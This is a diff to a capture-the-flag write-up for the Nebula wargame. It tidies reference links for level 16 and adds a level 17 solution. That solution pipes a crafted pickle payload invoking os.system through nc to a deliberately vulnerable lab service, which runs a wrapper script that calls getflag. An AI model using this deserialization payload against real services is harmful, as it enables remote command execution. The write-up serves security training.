@@ -493,8 +493,10 @@ level 16
 
 ##### see perl user input vulnerabilities and program execution
 > ref:
-> 1. [cgisecurity.com/lib/sips.html](http://www.cgisecurity.com/lib/sips.html)
-> 2. [novosial.org/perl/backticks/](novosial.org/perl/backticks/)
+> 
+> cgisecurity: [cgisecurity.com/lib/sips.html](http://www.cgisecurity.com/lib/sips.html)
+> 
+> novosial: [novosial.org/perl/backticks/](novosial.org/perl/backticks/)
 
 ##### inspect perl cgi script and use octal encoding to bypass the 'tr' transformation
 ```python
@@ -553,4 +555,28 @@ You have successfully executed getflag on a target account
 ```
 
 > Note: see pwntester article using bash '*' wildcard character
+> 
 > [ref: pwntester.com/blog/2013/11/26/nebula-level16-write-up/](http://www.pwntester.com/blog/2013/11/26/nebula-level16-write-up/)
+
+
+level 17
+-----------
+
+##### read documentation concerning pickle python module
+> take a look at 'restricting global' section
+> 
+> [ref: docs.python.org/3/library/pickle.html#restricting-globals](https://docs.python.org/3/library/pickle.html#restricting-globals)
+
+##### exploit pickle vulnerability
+```bash
+# from level16: chmod 777 /tmp/any_wrapper_shell
+level17@nebula:~$ echo -e '#!/bin/bash\ngetflag > /tmp/getflag17.$$.log\n' > /tmp/any_wrapper_shell
+
+level17@nebula:~$ echo -e "cos\nsystem\n(S'/tmp/any_wrapper_shell'\ntR." | nc nebula 10007
+Accepted connection from 127.0.0.1:42981^C
+
+level17@nebula:~$ ll /tmp/getflag17.5114.log 
+-rw-r--r-- 1 flag17 flag17 59 2016-08-20 21:00 /tmp/getflag17.5114.log
+level17@nebula:~$ cat /tmp/getflag17.5114.log 
+You have successfully executed getflag on a target account
+```
